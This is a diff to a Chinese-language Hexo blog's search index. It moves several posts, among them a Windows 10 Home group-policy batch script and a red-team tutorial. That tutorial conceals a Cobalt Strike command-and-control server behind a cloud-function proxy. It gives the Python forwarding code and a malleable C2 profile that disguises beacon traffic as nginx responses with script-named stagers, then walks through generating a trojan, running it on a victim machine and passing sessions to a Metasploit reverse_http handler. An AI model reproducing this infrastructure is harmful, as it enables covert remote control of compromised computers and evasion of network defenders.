@@ -59,6 +59,9 @@
 <p>第一条流量</p>
 <p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462633173.png" alt="clipboard-1630462633173"></p>
 ]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
       <tags>
         <tag>安全</tag>
       </tags>
@@ -121,6 +124,28 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>win10家庭版没有组策略解决方式</title>
+    <url>/win10%E5%AE%B6%E5%BA%AD%E7%89%88%E6%B2%A1%E6%9C%89%E7%BB%84%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<div class="note primary simple"><h5 id="1-新建一个文件"><a href="#1-新建一个文件" class="headerlink" title="1.新建一个文件"></a>1.新建一个文件</h5></div>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img%5Cdocument%5Cgpedit%5C118081416313.png" alt="118081416313"></p>
+<div class="note primary simple"><h5 id="2-将代码放入"><a href="#2-将代码放入" class="headerlink" title="2.将代码放入"></a>2.将代码放入</h5></div>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt</span><br><span class="line"></span><br><span class="line">for &#x2F;f %%i in (&#39;findstr &#x2F;i . List.txt 2^&gt;nul&#39;) do dism &#x2F;online &#x2F;norestart &#x2F;add-package:&quot;C:\Windows\servicing\Packages\%%i&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+<p>CTRL+C保存</p>
+<div class="note primary simple"><h5 id="3-将文件扩展名改为-bat"><a href="#3-将文件扩展名改为-bat" class="headerlink" title="3.将文件扩展名改为.bat"></a>3.将文件扩展名改为.bat</h5></div>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082125198.png" alt="img"></p>
+<div class="note primary simple"><h5 id="4-右键以管理员身份运行"><a href="#4-右键以管理员身份运行" class="headerlink" title="4.右键以管理员身份运行"></a>4.右键以管理员身份运行</h5></div>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082509921.png" alt="img"></p>
+<h5 id="5-将生成的临时文件list-txt删除"><a href="#5-将生成的临时文件list-txt删除" class="headerlink" title="5.将生成的临时文件list.txt删除"></a>5.将生成的临时文件list.txt删除</h5>]]></content>
+      <tags>
+        <tag>window</tag>
+      </tags>
   </entry>
   <entry>
     <title>selenium</title>
@@ -380,74 +405,12 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute_script(script, *args)</span><br><span class="line"></span><br><span class="line">js&#x3D;&quot;window.scrollTo(0,document.body.scrollHeight)&quot; #scrollTo滚动条 driver.execute_script(js)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>python</category>
+        <category>爬虫</category>
+      </categories>
       <tags>
         <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>win10家庭版没有组策略解决方式</title>
-    <url>/win10%E5%AE%B6%E5%BA%AD%E7%89%88%E6%B2%A1%E6%9C%89%E7%BB%84%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<div class="note primary simple"><h5 id="1-新建一个文件"><a href="#1-新建一个文件" class="headerlink" title="1.新建一个文件"></a>1.新建一个文件</h5></div>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img%5Cdocument%5Cgpedit%5C118081416313.png" alt="118081416313"></p>
-<div class="note primary simple"><h5 id="2-将代码放入"><a href="#2-将代码放入" class="headerlink" title="2.将代码放入"></a>2.将代码放入</h5></div>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt</span><br><span class="line"></span><br><span class="line">for &#x2F;f %%i in (&#39;findstr &#x2F;i . List.txt 2^&gt;nul&#39;) do dism &#x2F;online &#x2F;norestart &#x2F;add-package:&quot;C:\Windows\servicing\Packages\%%i&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
-
-<p>CTRL+C保存</p>
-<div class="note primary simple"><h5 id="3-将文件扩展名改为-bat"><a href="#3-将文件扩展名改为-bat" class="headerlink" title="3.将文件扩展名改为.bat"></a>3.将文件扩展名改为.bat</h5></div>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082125198.png" alt="img"></p>
-<div class="note primary simple"><h5 id="4-右键以管理员身份运行"><a href="#4-右键以管理员身份运行" class="headerlink" title="4.右键以管理员身份运行"></a>4.右键以管理员身份运行</h5></div>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082509921.png" alt="img"></p>
-<h5 id="5-将生成的临时文件list-txt删除"><a href="#5-将生成的临时文件list-txt删除" class="headerlink" title="5.将生成的临时文件list.txt删除"></a>5.将生成的临时文件list.txt删除</h5>]]></content>
-      <tags>
-        <tag>window</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>云函数和cs并派生到msf</title>
-    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
-    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
-<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
-<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
-<p>云函数内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
-<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
-<p>修改后发布即可</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
-<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
-<p><strong>可以使用80和443两个端口</strong></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
-<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>
-
-<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
-<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
-<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
-<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
-<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
-<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
-<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>
-
-<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
-<p>失败emmmm</p>
-]]></content>
-      <tags>
-        <tag>安全</tag>
       </tags>
   </entry>
   <entry>
@@ -500,5 +463,53 @@
       <categories>
         <category>web相关</category>
       </categories>
+  </entry>
+  <entry>
+    <title>云函数和cs并派生到msf</title>
+    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
+    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
+<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
+<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
+<p>云函数内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
+<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
+<p>修改后发布即可</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
+<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
+<p><strong>可以使用80和443两个端口</strong></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
+<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
+<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
+<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
+<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
+<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
+<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
+<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
+<p>失败emmmm</p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
   </entry>
 </search>
